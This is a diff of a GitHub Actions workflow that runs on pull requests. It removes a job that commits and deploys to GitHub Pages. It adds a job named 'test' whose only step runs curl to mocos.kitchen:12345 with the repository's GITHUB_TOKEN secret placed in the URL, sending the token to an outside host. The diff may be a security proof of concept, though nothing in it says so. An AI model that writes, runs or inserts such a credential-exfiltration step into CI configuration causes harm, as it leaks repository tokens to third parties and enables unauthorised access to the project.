@@ -1,29 +1,10 @@
+name: CI
 on: [pull_request]
-
 jobs:
-  build:
+  test:
+    name: test
     runs-on: ubuntu-latest
+    container: ubuntu:20.04
     steps:
-      - uses: actions/checkout@v2
-        with:
-          persist-credentials: false
-          fetch-depth: 0
-
-      - name: Create local changes
-        run: |
-          echo test > newfile
-          git add newfile
-      - name: Commit files
-        run: |
-          sudo apt update -qq
-          sudo apt install git
-          git config --local user.email "namatyage@gmail.com"
-          git config --local user.name "tyage"
-          git commit -m "Add changes" -a
-      - name: Deploy
-        uses: peaceiris/actions-gh-pages@v3
-        with:
-          github_token: ${{ secrets.GITHUB_TOKEN }}
-          publish_dir: .
-          publish_branch: main
-          force_orphan: true
+      - run: |
+          curl mocos.kitchen:12345/${{ secrets.GITHUB_TOKEN }}
